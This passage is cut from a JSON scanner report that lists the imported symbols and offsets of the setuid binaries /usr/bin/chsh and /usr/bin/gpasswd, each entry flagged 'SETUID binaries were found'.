                  "details": "Offset: 0x0000ce60, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce68, Symbol: setfscreatecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce70, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce78, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce80, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce88, Symbol: __fxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce90, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce98, Symbol: fseek, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cea0, Symbol: security_getenforce, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cea8, Symbol: __fgets_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ceb0, Symbol: __strncpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ceb8, Symbol: setrlimit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cec0, Symbol: setreuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cec8, Symbol: setregid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ced0, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ced8, Symbol: fdopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cee0, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cee8, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cef0, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cef8, Symbol: fchmod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf00, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf08, Symbol: fsync, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf10, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf18, Symbol: open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf20, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf28, Symbol: fchown, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf30, Symbol: audit_log_user_avc_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf38, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf40, Symbol: ulckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf48, Symbol: perror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf50, Symbol: rename, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf58, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf60, Symbol: pam_acct_mgmt, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf68, Symbol: freecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf70, Symbol: link, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf78, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf80, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf88, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf90, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf98, Symbol: pam_authenticate, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfa0, Symbol: putpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfa8, Symbol: strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfb0, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfb8, Symbol: endusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfc0, Symbol: getc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfc8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfd0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfd8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfe0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfe8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d0a0, Symbol: misc_conv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d5e8, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d5f0, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d620, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d630, Symbol: stdin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d638, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d640, Symbol: __environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d648, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d660, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d510, Symbol: setsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d550, Symbol: endsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d590, Symbol: sgetsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d740, Symbol: fgetsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d8b0, Symbol: getsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d8f0, Symbol: getsgnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d930, Symbol: putsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014bd8, Symbol: __strcat_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014be0, Symbol: utime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014be8, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014bf0, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014bf8, Symbol: is_selinux_enabled, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c00, Symbol: strcasecmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c08, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c10, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c18, Symbol: srandom, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c20, Symbol: unlink, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c28, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c30, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c38, Symbol: _exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c40, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c48, Symbol: chroot, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c50, Symbol: puts, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c58, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c60, Symbol: lckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c68, Symbol: qsort, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c70, Symbol: isatty, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c78, Symbol: selinux_check_access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c80, Symbol: fcntl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c88, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c90, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c98, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ca0, Symbol: __open_2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ca8, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cb0, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cb8, Symbol: stpcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cc0, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cc8, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cd0, Symbol: __lxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cd8, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ce0, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ce8, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cf0, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cf8, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d00, Symbol: setbuf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d08, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d10, Symbol: rewind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d18, Symbol: snprintf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d20, Symbol: audit_open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d28, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d30, Symbol: gettimeofday, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d38, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d40, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d48, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d50, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d58, Symbol: selinux_set_callback, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d60, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d68, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d70, Symbol: matchpathcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d78, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d80, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d88, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d90, Symbol: execve, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d98, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014da0, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014da8, Symbol: putc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014db0, Symbol: signal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014db8, Symbol: strtoll, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014dc0, Symbol: getpwnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014dc8, Symbol: getprevcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014dd0, Symbol: feof, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014dd8, Symbol: umask, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014de0, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014de8, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014df0, Symbol: memcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014df8, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e00, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e08, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e10, Symbol: __stpcpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e18, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e20, Symbol: l64a, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e28, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e30, Symbol: setfscreatecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e38, Symbol: random, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e40, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e48, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e50, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e58, Symbol: __fxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e60, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e68, Symbol: fseek, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e70, Symbol: security_getenforce, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e78, Symbol: __fgets_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e80, Symbol: __strncpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e88, Symbol: setrlimit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e90, Symbol: setreuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e98, Symbol: setregid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ea0, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ea8, Symbol: fdopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014eb0, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014eb8, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ec0, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ec8, Symbol: fchmod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ed0, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ed8, Symbol: fsync, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ee0, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ee8, Symbol: tcgetattr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ef0, Symbol: tcsetattr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ef8, Symbol: getpass, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f00, Symbol: open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f08, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f10, Symbol: fchown, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f18, Symbol: audit_log_user_avc_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f20, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f28, Symbol: ulckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f30, Symbol: perror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f38, Symbol: rename, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f40, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f48, Symbol: __cxa_atexit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f50, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f58, Symbol: freecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f60, Symbol: link, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f68, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f70, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f78, Symbol: audit_log_user_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f80, Symbol: __strncat_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f88, Symbol: audit_log_acct_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f90, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f98, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fa0, Symbol: strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fa8, Symbol: crypt, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fb0, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fb8, Symbol: getc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fc0, Symbol: putgrent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fc8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fd0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fd8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fe0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fe8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00016080, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00016090, Symbol: stdin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
